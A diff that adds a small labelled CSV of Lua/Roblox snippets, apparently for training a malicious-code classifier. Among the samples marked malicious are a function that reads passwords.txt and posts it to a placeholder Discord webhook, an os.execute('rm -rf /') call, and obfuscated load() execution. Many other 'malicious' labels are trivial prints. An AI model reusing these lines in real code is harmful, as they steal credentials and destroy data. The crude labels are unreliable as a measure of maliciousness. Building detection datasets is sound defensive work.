@@ -1,0 +1,81 @@
+code,label
+function bad_function()
+  print("This is a malicious function.")
+end,1
+for i = 1, 5 do
+  print(i)
+end,0
+local function secret_backdoor()
+  print("This is a secret backdoor.")
+end,1
+local str = "Hello, world!"
+print(str),0
+function hidden_backdoor()
+  print("This is a hidden backdoor.")
+end,1
+local function obfuscated_code()
+  local x = "A"
+  for i = 1, 10 do
+    x = x .. string.char(string.byte(x, 1) + 1)
+  end
+  load(x)()
+end,1
+for i = 1, 50 do
+  print(i)
+  if i % 5 == 0 then
+    http:RequestAsync({
+        Url = "https://discord.com/api/webhooks/1234567890/abcdefg",
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = game:GetService("HttpService"):JSONEncode({
+            content = "This is a webhook message."
+        })
+    })
+  end
+end,1
+function malicious_code()
+  while true do
+    print("This code will keep running forever!")
+  end
+end,1
+for i = 1, 5 do
+  print("This is a benign loop.")
+end,0
+local function dangerous_code()
+  local file = io.open("passwords.txt", "r")
+  local contents = file:read("*all")
+  http:RequestAsync({
+      Url = "https://discord.com/api/webhooks/1234567890/abcdefg",
+      Method = "POST",
+      Headers = {
+          ["Content-Type"] = "application/json"
+      },
+      Body = game:GetService("HttpService"):JSONEncode({
+          content = contents
+      })
+  })
+end,1
+for i = 1, 10 do
+  print("This is another benign loop.")
+end,0
+function malicious_function()
+  os.execute("rm -rf /")
+end,1
+while true do
+  print("This is a never-ending loop.")
+end,1
+local function obfuscated_backdoor()
+  local x = "B"
+  for i = 1, 20 do
+    x = x .. string.char(string.byte(x, 1) + 1)
+  end
+  local y = ""
+  for i = 1, #x do
+    if i % 2 == 0 then
+      y = y .. x:sub(i, i)
+    end
+  end
+  load(y)()
+end,1
